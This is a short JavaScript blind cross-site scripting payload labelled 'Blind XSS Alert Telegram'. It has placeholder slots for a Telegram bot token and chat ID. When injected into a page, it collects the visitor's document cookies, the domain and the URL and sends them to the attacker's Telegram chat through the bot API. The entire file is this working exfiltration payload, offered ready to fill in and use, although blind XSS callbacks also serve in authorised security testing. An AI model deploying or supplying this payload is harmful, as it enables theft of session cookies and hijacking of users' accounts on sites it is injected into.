var tokenBot = '31337317:L3e-7h4x00r_1tsr4md0mbruHhh000'; // Your "tokenBot" Here
var chatId = '31337'; // Your "chatId" Here

/*
	 _                     _       _      
	| |____  _____ ___    | |_ ___| | ___ 
	| '_ \ \/ / __/ __|___| __/ _ \ |/ _ \
	| |_) >  <\__ \__ \___| ||  __/ |  __/
	|_.__/_/\_\___/___/    \__\___|_|\___|
	------ Blind XSS Alert Telegram ------
	                           zerobyte.id
*/

function telegramSend(tokenBot, chatId) {
	var kuki = document['cookie'].length != 0 ? '%0d%0a*-+Document+Cookie+-*%0d%0a`' + document['cookie'] + '`' : '';
	var textData = '*XSS+Alert+in+' + document['domain']+'*%0d%0a------------------------------------------------%0d%0a%0d%0a*-+URL+Target+-*%0d%0a`' + document['URL'] + '`%0d%0a' + kuki;
    var xhr = new XMLHttpRequest();
    xhr.open('GET', 'https://api.telegram.org/bot' + tokenBot + '/sendMessage?chat_id=' + chatId + '&text=' + textData + '&parse_mode=markdown', true);
    xhr.send();
}
telegramSend(tokenBot, chatId)
